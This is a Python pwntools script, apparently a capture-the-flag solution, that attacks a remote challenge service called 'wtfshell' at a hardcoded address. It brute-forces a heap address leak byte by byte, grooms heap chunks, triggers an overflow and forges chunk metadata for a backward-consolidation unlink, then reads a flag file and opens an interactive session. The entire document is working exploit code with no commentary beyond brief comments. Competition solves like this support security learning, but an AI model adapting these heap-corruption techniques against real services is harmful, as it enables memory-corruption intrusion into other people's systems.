from pwn import *

a = open("log", "w")

# r = process("./wtfshell")
r = remote("35.233.147.96", 42531)

def rec(): return r.recvuntil("\xe2\x88\x9a ")
rec()
r.sendline("stfu.B")
r.sendline("stfu.A")
rec()

leak = "\x80"

r.sendline("asap.A")
r.recvuntil(":")
r.send("A"*0x40)
r.recvuntil(":")
r.send("A"*0x40)

while len(leak) < 6:
	for c in range(0, 256):
		print(c)
		if c == 10:
			continue

		a = ""
		r.send(chr(c) + "\n")
		try:
			a = r.recvuntil("\xe2\x88\x9a ", timeout=0.5)
		except:
			pass

		if "\xe2\x88\x9a" not in a or "Q.E.D" in a:
			leak += chr(c)
			print(leak)
			break
		else:
			r.sendline("asap.A")
			r.recvuntil(":")
			r.send("A"*0x40)
			r.recvuntil(":")
			r.send("A"*0x40)
			for k in leak:
				r.send(k)

heap = u64(leak + "\x00\x00")
print("HEAP", hex(heap))

r.sendline("sus.A")
r.sendline("A")
r.sendline("sus")
rec()

files = [chr(0x41 + i) for i in range(30)]
for i in range(20):
	r.sendline("nsfw.{}.3".format(files[i]))
	rec()
r.sendline("wtf." + "B"*0x3f8 + ".A")
rec()
for i in range(12):
	r.sendline("rip.A")
	if i == 0:
		payload = "A"*8 + "/\x03//////"
		r.send(payload + "A"*(0x100 - len(payload)))
	else:
		r.send("D"*0x100)
	rec()

r.sendline("wtf." + "B"*0x3f8 + ".B")
rec()

for i in range(4, 4+6):
	r.sendline("wtf." + "B"*0x3f8 + "." + files[i]) # E, F, G, H, I, J
	rec()
for i in range(4+6, 4+6+7):
	r.sendline("wtf." + "B"*0x2e8 + "." + files[i]) # E, F, G, H, I, J
	rec()

r.sendline("rip.A")
r.send("D"*0x100)
rec()


r.sendline("wtf." + "B"*0x3f8 + ".C") # 0x410 chunk
rec()

r.sendline("wtf." + "D"*0x3f8 + ".D")
rec()
for i in range(4):
	r.sendline("rip.D")
	r.send("D"*0x100)
	rec()

for i in range(4+6, 4+6+7):
	r.sendline("gtfo." + files[i])
	rec()
r.sendline("gtfo.E")
r.sendline("gtfo.F")
r.sendline("gtfo.G")
r.sendline("gtfo.H")
r.sendline("gtfo.I")
r.sendline("gtfo.J")
r.sendline("rip.C")
r.sendline("B"*0x10)
for i in range(7): rec()

r.sendline("irl")
rec()

# Now let's construct 0x321 victim
for i in range(10):
	r.sendline("nsfw.{}.3".format(files[i]))
	rec()

r.sendline("wtf." + "A"*0x2b8 + ".A")
rec()

r.sendline("wtf." + "E"*0x208 + ".B") # B is victim
rec()
r.sendline("rip.B")
r.send("E"*0x100)
rec()

# Eat up other bins
r.sendline("wtf." + "A"*0x170 + ".C")
rec()
r.sendline("wtf." + "A"*0x130 + ".D")
rec()
r.sendline("wtf." + "A"*0xb0 + ".E")
rec()
r.sendline("wtf." + "A"*0x30 + ".F")
rec()
r.sendline("wtf." + "A"*0x220 + ".G")
rec()
r.sendline("wtf." + "A"*0x220 + ".H")
rec()

# Trigger bug
r.send("A"*0x400)
rec()
r.send("gtfo." + "A"*(0x400 - 5))
rec()

for i in range(6):
	r.sendline("wtf." + "F"*(0x2f8 + (6 - i)) + "\x31" + ".B")
	rec()

r.sendline("wtf." + "F"*0x2f8 + "\x01\x09" + ".B")
rec()

victim_addr = heap + 0xa30
fake_fd_bk  = heap + 0x740
fake_unlink = fake_fd_bk - 0x10

# Do backwards consolidation
payload = "gtfo.B."
payload += "A"*(0x100-len(payload)) + p64(0x0) + p64(0x301) + p64(fake_fd_bk) + p64(fake_fd_bk) + p64(fake_unlink)*2
r.sendline(payload)
rec()

for i in range(2):
	uname = chr(0x41 + i)*2
	r.sendline("stfu,{}.".format(uname))
	rec()

r.sendline("sus.BB")
r.sendline("nsfw.flag.3")

flag_loc = heap - 0x520

payload = "A"*0xff + "." + p64(0x0) + p64(0x61) + "B"*0x40 + p64(flag_loc) + "\x02"
r.sendline(payload)
r.sendline("lol.-l")

r.interactive()